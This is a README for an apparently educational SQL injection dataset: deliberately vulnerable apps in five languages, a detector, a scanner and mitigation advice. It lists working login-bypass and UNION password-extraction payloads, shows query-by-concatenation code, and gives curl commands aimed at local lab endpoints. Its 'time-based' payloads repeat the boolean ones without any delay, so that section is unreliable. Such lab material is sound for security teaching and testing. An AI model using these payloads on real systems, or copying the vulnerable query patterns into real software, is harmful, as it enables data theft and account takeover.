# SQL Injection Vulnerable Code Dataset

A comprehensive collection of SQL injection vulnerable code examples for research, education, and security testing purposes.

## ⚠️ WARNING

**This dataset contains intentionally vulnerable code that should NEVER be used in production environments.**

This code is designed for:
- Educational purposes
- Security research
- Testing security tools and scanners
- Academic studies
- Penetration testing training

## ⚠️ UPDATE: FILES MERGED

- `sql_vulnerable_dataset.py` has been merged into `unsafe_code_examples/python/sql_injection.py`.
- All unique vulnerable code examples, dataset generation utilities, and advanced patterns are now in this single file.
- You can find all Flask endpoints, class-based examples, and dataset utilities in `unsafe_code_examples/python/sql_injection.py`.

## 📁 Dataset Structure (Updated)

```
06.27/
├── app.py                              # SQL Injection Web Scanner (Flask app on port 5000)
├── sql_injection_detector.py           # SQL injection detection tool
├── dataset_summary.py                  # Dataset analysis and summary tool
├── safe_code_examples/                 # Safe code examples for comparison
├── unsafe_code_examples/
│   └── python/
│       └── sql_injection.py            # Comprehensive Python vulnerable examples (ALL MERGED)
│       └── sql_injection_dataset.json  # JSON dataset with examples and payloads
│   └── php/
│       └── basic_injection.php         # PHP vulnerable examples
│   └── java/
│       └── basic_injection.java        # Java vulnerable examples
│   └── javascript/
│       └── basic_injection.js          # JavaScript/Node.js vulnerable examples
│   └── csharp/
│       └── basic_injection.cs          # C# vulnerable examples
└── results/                            # Output and results directory
    └── pasted_code_result.docx         # Generated documentation
```

## 🎯 Dataset Contents (Updated)

### Main Python Application (`app.py`)

A Flask-based SQL Injection Web Scanner running on port 5000 with endpoints for:
- Scanning Python code for SQL/NoSQL injection vulnerabilities
- Analyzing code patterns and identifying risks
- Providing detailed vulnerability reports

### Comprehensive Python Examples (`unsafe_code_examples/python/sql_injection.py`)

**MERGED FILE**: Contains all vulnerable patterns, dataset generation utilities, and advanced techniques from both `sql_injection.py` and `sql_vulnerable_dataset.py`.

#### Features:
- **Flask web application** with many vulnerable endpoints
- **Class-based and function-based examples**
- **Multiple database support** (SQLite, MySQL, PostgreSQL, MongoDB)
- **Advanced injection techniques** (Union, Error, Boolean, Time-based, Blind)
- **Real-world vulnerability patterns** (E-commerce, Banking, CMS, API)
- **Input validation bypasses** and framework-specific vulnerabilities
- **Dataset generation utilities** for research and testing

#### Available Endpoints and Classes:
- All endpoints and classes from both original files are now available in this single file.
- See the file for details on usage and available routes.

## 🔍 Vulnerability Types Covered

### 1. Authentication Bypass
```sql
-- Example payloads
admin' OR '1'='1
admin' OR '1'='1' --
admin' OR '1'='1' #
```

### 2. Data Extraction
```sql
-- Union-based injection
1 UNION SELECT 1,2,3,4
1 UNION SELECT username,password FROM users
1 UNION SELECT table_name,column_name FROM information_schema.columns
```

### 3. Database Information Gathering
```sql
-- Information schema queries
1 AND (SELECT COUNT(*) FROM information_schema.tables) > 0
1 AND (SELECT COUNT(*) FROM information_schema.columns) > 0
```

### 4. Blind SQL Injection
```sql
-- Boolean-based
1 AND (SELECT COUNT(*) FROM users) > 0
1' AND (SELECT COUNT(*) FROM users) > 0 --

-- Time-based
1 AND (SELECT COUNT(*) FROM users) > 0
1' AND (SELECT COUNT(*) FROM users) > 0 --
```

### 5. NoSQL Injection
```javascript
// MongoDB injection examples
{"username": "admin", "$ne": ""}
{"username": "admin", "$where": "1==1"}
```

### 6. Additional Patterns (from unsafe_code_example.py)
```python
# Cookie-based injection
session_id = request.cookies['session']
query = "SELECT * FROM sessions WHERE id = " + session_id

# Header-based injection
user_agent = request.headers.get('User-Agent', '')
query = "INSERT INTO logs (user_agent) VALUES ('" + user_agent + "')"

# JSON-based injection
data = request.get_json()
user_id = data.get('user_id', '')
query = "SELECT * FROM users WHERE id = " + str(user_id)
```

## 🛡️ Mitigation Strategies

The dataset includes 10 key mitigation strategies:

1. **Use parameterized queries/prepared statements**
2. **Input validation and sanitization**
3. **Use ORM frameworks with built-in protection**
4. **Implement proper error handling**
5. **Use least privilege database accounts**
6. **Regular security testing and code reviews**
7. **Input length restrictions**
8. **Whitelist validation for allowed characters**
9. **Use stored procedures**
10. **Implement proper authentication and authorization**

## 🚀 Usage Examples (Updated)

### Running the Main Applications

```bash
# SQL Injection Web Scanner (Port 5000)
python app.py

# Comprehensive Vulnerable Application (Port 5001 or as specified in the file)
cd unsafe_code_examples/python
python sql_injection.py
```

### Testing the Vulnerable Endpoints

```bash
# Test authentication bypass
curl -X POST http://localhost:5001/vulnerable_login \
  -d "username=admin' OR '1'='1&password=password"

# Test search functionality
curl "http://localhost:5001/vulnerable_search?q=test' UNION SELECT 1,2,3,4 --"

# Test user profile endpoint
curl "http://localhost:5001/vulnerable_user/1' OR '1'='1"

# Test cookie-based injection
curl -H "Cookie: session=1' OR '1'='1" http://localhost:5001/vulnerable_cookie

# Test header-based injection
curl -X POST -H "User-Agent: test' OR '1'='1" http://localhost:5001/vulnerable_header

# Test JSON-based injection
curl -X POST -H "Content-Type: application/json" \
  -d '{"user_id": "1 OR 1=1"}' http://localhost:5001/vulnerable_json
```

### Using the Detection Tools

```python
# SQL Injection Detector
python sql_injection_detector.py

# Dataset Summary Tool
python dataset_summary.py
```

## 📊 Dataset Statistics

- **Total Examples**: 20+ (including merged patterns)
- **Programming Languages**: 5 (Python, PHP, Java, JavaScript, C#)
- **Vulnerability Categories**: 15+
- **Payload Types**: 6+
- **Severity Levels**: 3 (Critical, High, Medium)
- **Web Endpoints**: 12 vulnerable endpoints
- **Database Types**: 4 (SQLite, MySQL, PostgreSQL, MongoDB)

## 🔧 Setup Instructions

### Prerequisites

1. **Python 3.7+**
2. **Database servers** (MySQL, PostgreSQL, SQLite)
3. **Language-specific dependencies**

### Installation

```bash
# Clone or download the dataset
cd 06.27

# Install Python dependencies
pip install flask mysql-connector-python psycopg2-binary pymongo

# For Node.js examples
npm install mysql sqlite3 express mongodb

# For PHP examples
# Ensure mysqli and PDO extensions are enabled
```

### Quick Start

```bash
# 1. Start the vulnerable application
cd unsafe_code_examples/python
python sql_injection.py

# 2. Start the web scanner (in another terminal)
cd ../..
python app.py

# 3. Access the applications
# Vulnerable app: http://localhost:5001
# Web scanner: http://localhost:5000
```

## 🧪 Testing and Validation

### Running the Vulnerable Applications

```bash
# Python Flask application (Comprehensive)
cd unsafe_code_examples/python
python sql_injection.py

# Node.js Express application
cd unsafe_code_examples/javascript
node basic_injection.js

# PHP application (requires web server)
# Place PHP files in web server directory and access via browser
```

### Testing Payloads

Use the provided payloads to test the vulnerable applications:

```bash
# Authentication bypass
curl -X POST http://localhost:5001/vulnerable_login \
  -d "username=admin' OR '1'='1&password=password"

# Union-based injection
curl "http://localhost:5001/vulnerable_search?q=test' UNION SELECT 1,2,3,4 --"

# Error-based injection
curl "http://localhost:5001/vulnerable_error?id=1' AND (SELECT COUNT(*) FROM information_schema.tables) > 0"

# Time-based injection
curl "http://localhost:5001/vulnerable_time?id=1' AND (SELECT COUNT(*) FROM users WHERE id = 1) > 0"
```

## 📚 Educational Resources

### Related Files in This Project

- `sql_injection_detection_python.md` - Detailed guide on SQL injection detection
- `sql_injection_detector.py` - Python-based SQL injection detection tool
- `safe_code_example.py` - Examples of secure coding practices
- `dataset_summary.py` - Dataset analysis and summary tool

### Additional Learning Resources

1. **OWASP SQL Injection Guide**
2. **SQL Injection Prevention Cheat Sheet**
3. **Database Security Best Practices**
4. **Web Application Security Testing**

## 🤝 Contributing

To contribute to this dataset:

1. Add new vulnerability examples
2. Improve existing examples
3. Add new programming languages
4. Enhance payload collections
5. Update mitigation strategies

## 📄 License

This dataset is provided for educational and research purposes only. Use responsibly and in controlled environments.

## ⚖️ Disclaimer

The authors are not responsible for any misuse of this dataset. This code is intentionally vulnerable and should only be used in controlled, educational environments. Never deploy this code in production systems.

---

**Remember: Security research should always be conducted ethically and legally!** 